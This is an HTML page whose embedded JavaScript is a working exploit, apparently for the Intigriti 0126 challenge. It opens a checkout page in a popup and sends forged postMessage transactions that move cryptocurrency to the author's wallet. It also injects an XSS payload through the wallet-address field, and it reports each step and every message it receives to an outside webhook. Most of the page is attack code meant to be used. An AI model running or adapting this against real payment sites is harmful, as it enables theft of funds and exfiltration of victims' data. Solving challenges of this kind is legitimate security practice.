<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Multi-Currency Test</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
</head>
<body>
    <h1>EXPLOIT - Multi Currency</h1>
    <div id="log">Starting...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/468bec37-fda7-4e34-9511-3688c97cf804';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';

        // Try ALL currencies - admin might not have 1337COIN wallet
        const CURRENCIES = ['BTC', 'ETH', 'XMR', '1337COIN'];

        function log(msg) {
            document.getElementById('log').innerHTML += '<br>' + msg;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        track('start', 'loaded', {});

        let popup = null;
        let currentCurrencyIndex = 0;

        function testNextCurrency() {
            if (currentCurrencyIndex >= CURRENCIES.length) {
                log('All currencies tested!');
                track('all_tested', 'done', { count: CURRENCIES.length });
                return;
            }

            const currency = CURRENCIES[currentCurrencyIndex];
            log(`Testing ${currency}...`);
            track('testing_currency', 'start', { currency });

            // Open popup with this currency
            if (popup && !popup.closed) {
                popup.close();
            }

            popup = window.open(
                `${BASE}/checkout.html?currency=${currency}&price=100`,
                'checkout',
                'width=1000,height=800'
            );

            if (!popup) {
                log('Popup blocked!');
                track('popup_blocked', 'failed', {});
                return;
            }

            track('popup_opened', 'success', { currency });

            // Wait and send transaction
            setTimeout(() => {
                log(`Sending ${currency} transaction...`);
                track('sending', 'start', { currency });

                // Send transaction to our wallet
                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: currency,
                        amount: 1
                    }
                }, '*');

                track('tx_sent', 'done', { currency, to: YOUR_WALLET });
                log(`${currency} transaction sent!`);

                // Move to next currency after delay
                setTimeout(() => {
                    currentCurrencyIndex++;
                    testNextCurrency();
                }, 5000);

            }, 10000); // 10 second wait per currency
        }

        // Also try XSS with the last currency
        function sendXSS(currency) {
            log(`Sending XSS with ${currency}...`);
            track('sending_xss', 'start', { currency });

            popup.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: XSS_WALLET,
                    currency: currency,
                    amount: 1
                }
            }, '*');

            track('xss_sent', 'done', { currency });
            log('XSS transaction sent!');
        }

        // Start testing
        setTimeout(testNextCurrency, 2000);

        // Listen for responses
        window.addEventListener('message', (event) => {
            log(`[MSG] ${JSON.stringify(event.data).substring(0, 100)}`);
            track('msg_received', 'info', event.data);
        });
    </script>
</body>
</html>
